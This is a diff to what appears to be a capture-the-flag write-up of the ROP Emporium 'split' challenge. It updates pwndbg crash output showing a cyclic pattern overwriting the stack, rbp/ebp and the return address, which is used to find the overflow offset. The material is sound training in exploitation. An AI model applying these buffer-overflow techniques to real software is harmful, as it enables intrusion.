@@ -134,24 +134,55 @@ aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaa
 Let's provide this as input.
 
 ```
-──────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────
-*RAX  0xb
- RBX  0x0
-*RCX  0x7ffff7ea2a37 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
-*RDX  0x1
-*RDI  0x7ffff7fa9a70 (_IO_stdfile_1_lock) ◂— 0x0
-*RSI  0x1
-*R8   0xa
-*R9   0x7ffff7fc9040 (_dl_fini) ◂— endbr64
-*R10  0x7ffff7d945e8 ◂— 0xf001200001a64
-*R11  0x246
-*R12  0x7fffffffdfd8 —▸ 0x7fffffffe21b ◂— '/home/kunal/ropEmporium/split/split'
-*R13  0x400697 (main) ◂— push rbp
- R14  0x0
-*R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0x0
-*RBP  0x6161616161616165 ('eaaaaaaa')
-*RSP  0x7fffffffdeb8 ◂— 'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaa'
-*RIP  0x400741 (pwnme+89) ◂— ret
+───────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────
+ RAX  0xb
+ RBX  0
+ RCX  0x7ffff7ea1887 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
+ RDX  1
+ RDI  0x7ffff7fa9a70 (_IO_stdfile_1_lock) ◂— 0
+ RSI  1
+ R8   0xa
+ R9   0x7ffff7fc9040 (_dl_fini) ◂— endbr64
+ R10  0x7ffff7d935e8 ◂— 0xf001200001a64
+ R11  0x246
+ R12  0x7fffffffdda8 —▸ 0x7fffffffdfed ◂— '/home/kunal/ropemporium/split/split'
+ R13  0x400697 (main) ◂— push rbp
+ R14  0
+ R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
+ RBP  0x6161616161616165 ('eaaaaaaa')
+ RSP  0x7fffffffdc88 ◂— 'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaa'
+ RIP  0x400741 (pwnme+89) ◂— ret
+────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────
+ ► 0x400741 <pwnme+89>    ret                                <0x6161616161616166>
+    ↓
+
+
+
+
+
+
+
+
+
+─────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fffffffdc88 ◂— 'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaa'
+01:0008│     0x7fffffffdc90 ◂— 'gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaa'
+02:0010│     0x7fffffffdc98 ◂— 'haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaa'
+03:0018│     0x7fffffffdca0 ◂— 'iaaaaaaajaaaaaaakaaaaaaalaaaaaaa'
+04:0020│     0x7fffffffdca8 ◂— 'jaaaaaaakaaaaaaalaaaaaaa'
+05:0028│     0x7fffffffdcb0 ◂— 'kaaaaaaalaaaaaaa'
+06:0030│     0x7fffffffdcb8 ◂— 'laaaaaaa'
+07:0038│     0x7fffffffdcc0 ◂— 0
+───────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
+ ► 0         0x400741 pwnme+89
+   1 0x6161616161616166
+   2 0x6161616161616167
+   3 0x6161616161616168
+   4 0x6161616161616169
+   5 0x616161616161616a
+   6 0x616161616161616b
+   7 0x616161616161616c
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
 The `rbp` register points to `0x6161616161616165` which is the little endian (LSB at lowest address, MSB at highest address) represention of `eaaaaaaa` in ASCII.
@@ -340,7 +371,7 @@ In this case we do not need a `pop rdi` gadget because as we saw the arguments a
 
 We now have to find the offset using a cyclic pattern.
 
-```
+```gdb
 pwndbg> cyclic
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
 ```
@@ -354,10 +385,41 @@ Let's provide this as input.
  ECX  0xf7fae9b4 (_IO_stdfile_1_lock) ◂— 0
  EDX  1
  EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0
- ESI  0xffffcea4 —▸ 0xffffcfeb ◂— '/home/kunal/ropemporium/split/split32'
+ ESI  0xffffcea4 —▸ 0xffffcfde ◂— '/home/kunal/ropemporium/split/split32'
  EBP  0x6161616b ('kaaa')
  ESP  0xffffcdd0 ◂— 'maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaa'
  EIP  0x6161616c ('laaa')
+─────────────────────[ DISASM / i386 / set emulate on ]─────────────────────
+Invalid address 0x6161616c
+
+
+
+
+
+
+
+
+
+
+─────────────────────────────────[ STACK ]──────────────────────────────────
+00:0000│ esp 0xffffcdd0 ◂— 'maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaa'
+01:0004│     0xffffcdd4 ◂— 'naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaa'
+02:0008│     0xffffcdd8 ◂— 'oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaa'
+03:000c│     0xffffcddc ◂— 'paaaqaaaraaasaaataaauaaavaaawaaaxaaa'
+04:0010│     0xffffcde0 ◂— 'qaaaraaasaaataaauaaavaaawaaaxaaa'
+05:0014│     0xffffcde4 ◂— 'raaasaaataaauaaavaaawaaaxaaa'
+06:0018│     0xffffcde8 ◂— 'saaataaauaaavaaawaaaxaaa'
+07:001c│     0xffffcdec ◂— 'taaauaaavaaawaaaxaaa'
+───────────────────────────────[ BACKTRACE ]────────────────────────────────
+ ► 0 0x6161616c
+   1 0x6161616d
+   2 0x6161616e
+   3 0x6161616f
+   4 0x61616170
+   5 0x61616171
+   6 0x61616172
+   7 0x61616173
+────────────────────────────────────────────────────────────────────────────
 ```
 
 The `ebp` register points to `0x6161616b` which is the little endian (LSB at lowest address, MSB at highest address) represention of `kaaa` in ASCII.
